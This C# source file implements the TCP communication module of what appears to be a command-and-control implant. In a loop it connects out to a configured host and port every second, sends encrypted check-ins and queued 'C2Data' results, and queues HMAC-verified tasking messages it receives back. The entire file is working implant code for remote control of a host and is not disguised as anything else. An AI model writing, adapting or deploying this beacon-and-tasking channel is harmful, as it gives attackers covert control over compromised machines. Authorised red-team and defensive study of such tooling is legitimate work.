using Agent.Controllers;
using Agent.Interfaces;

using Common;
using Common.Models;

using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Modules
{
    class TcpStateObject
    {
        public TcpClient workClient = null;
        public NetworkStream workStream = null;
        public const int BufferSize = 65535;
        public byte[] buffer = new byte[BufferSize];
    }

    public class TcpClientModule : ICommModule
    {
        public string Hostname { get; private set; }
        private int Port { get; set; }
        private ConfigController Config { get; set; }
        private CryptoController Crypto { get; set; }
        public ModuleStatus ModuleStatus { get; set; }
        private Queue<AgentMessage> InboundC2Data { get; set; } = new Queue<AgentMessage>();
        private Queue<AgentMessage> OutboundC2Data { get; set; } = new Queue<AgentMessage>();

        private static ManualResetEvent AllDone = new ManualResetEvent(false);

        public TcpClientModule(string hostname, int port)
        {
            Hostname = hostname;
            Port = port;
        }

        public ModuleStatus GetStatus()
        {
            return ModuleStatus;
        }

        public void Init(ConfigController config, CryptoController crypto)
        {
            ModuleStatus = ModuleStatus.Starting;
            Crypto = crypto;
            Config = config;
        }

        public bool RecvData(out AgentMessage message)
        {
            if (InboundC2Data.Count > 0)
            {
                message = InboundC2Data.Dequeue();
                return true;
            }

            message = null;
            return false;
        }

        public void SendData(AgentMessage message)
        {
            OutboundC2Data.Enqueue(message);
        }

        public void Start()
        {
            ModuleStatus = ModuleStatus.Running;

            Task.Factory.StartNew(delegate ()
            {
                while (ModuleStatus == ModuleStatus.Running)
                {
                    AllDone.Reset();
                    var client = new TcpClient();
                    client.BeginConnect(Hostname, Port, new AsyncCallback(RequestCallback), client);
                    AllDone.WaitOne();

                    Thread.Sleep(1000);
                }
            });
        }

        private void RequestCallback(IAsyncResult ar)
        {
            var client = ar.AsyncState as TcpClient;
            client.EndConnect(ar);

            AllDone.Set();

            try
            {
                var stream = client.GetStream();
                var messages = new List<AgentMessage>();

                if (OutboundC2Data.Count > 0)
                {
                    while (OutboundC2Data.Count != 0)
                    {
                        messages.Add(OutboundC2Data.Dequeue());
                    }
                }
                else
                {
                    messages.Add(new AgentMessage
                    {
                        IdempotencyKey = Guid.NewGuid().ToString(),
                        Metadata = new AgentMetadata(),
                        Data = new C2Data()
                    });
                }

                var encrypted = Crypto.Encrypt(messages);
                var state = new TcpStateObject { workClient = client, workStream = stream };

                stream.BeginWrite(encrypted, 0, encrypted.Length, new AsyncCallback(WriteCallback), state);
            }
            catch
            {
                // Agent has probably been closed or killed
                ModuleStatus = ModuleStatus.Stopped;
            }
        }

        private void WriteCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as TcpStateObject;
            state.workStream.EndWrite(ar);
            state.workStream.BeginRead(state.buffer, 0, state.buffer.Length, new AsyncCallback(ReadCallback), state);
        }

        private void ReadCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as TcpStateObject;
            var bytesReceived = state.workStream.EndRead(ar);

            if (bytesReceived > 0)
            {
                var dataReceived = state.buffer.TrimBytes();
                
                if (Crypto.VerifyHMAC(dataReceived))
                {
                    var messages = Crypto.Decrypt<List<AgentMessage>>(dataReceived);

                    if (messages != null)
                    {
                        foreach (var message in messages)
                        {
                            if (!string.IsNullOrEmpty(message.Data.Module))
                            {
                                InboundC2Data.Enqueue(message);
                            }
                        }
                    }
                }
            }

            state.workStream.Close();
            state.workClient.Close();
        }

        public void Stop()
        {
            ModuleStatus = ModuleStatus.Stopped;
        }
    }
}